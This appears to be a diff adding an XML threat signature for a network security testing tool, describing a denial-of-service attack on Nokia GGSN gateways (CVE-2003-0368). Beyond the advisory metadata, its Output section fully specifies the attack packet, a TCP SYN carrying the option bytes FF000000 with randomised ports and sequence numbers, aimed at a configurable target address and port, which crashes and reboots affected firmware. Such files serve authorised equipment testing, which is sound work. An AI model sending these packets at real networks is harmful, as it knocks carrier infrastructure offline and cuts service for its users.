@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Nokia GGSN TCP Option Denial of Service"/>
+    <EngDesc display="true" value="This threat sends a TCP Packet with the option set to 0xFF.  Causes the Nokia GGSN to crash and reboot with certain versions of firmware."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="TCP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Wireless_AP"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Nokia"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Nokia_GGSN"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Nokia_GGSN"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.atstake.com/research/advisories/2003/a060903-1.txt"/>
+    <CVEID display="true" value="CVE-2003-0368"/>
+    <bugtraqID display="true" value="7854"/>
+    <OSVDB display="true" value="4327"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000001011da1188700c000a80001003c44e75a9c"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742200496093750"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1139462346" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="40" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026, 65535)" destPort="$destPort" SeqNumber="@random(0, FFFFFFFF)" AckNumber="0" HeaderLength="" WindowSize="1000" Checksum="" UrgentPointer="" Options="FF000000" Payload="" CWR="false" ECE="false" URG="false" ACK="false" PSH="false" RST="false" SYN="true" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
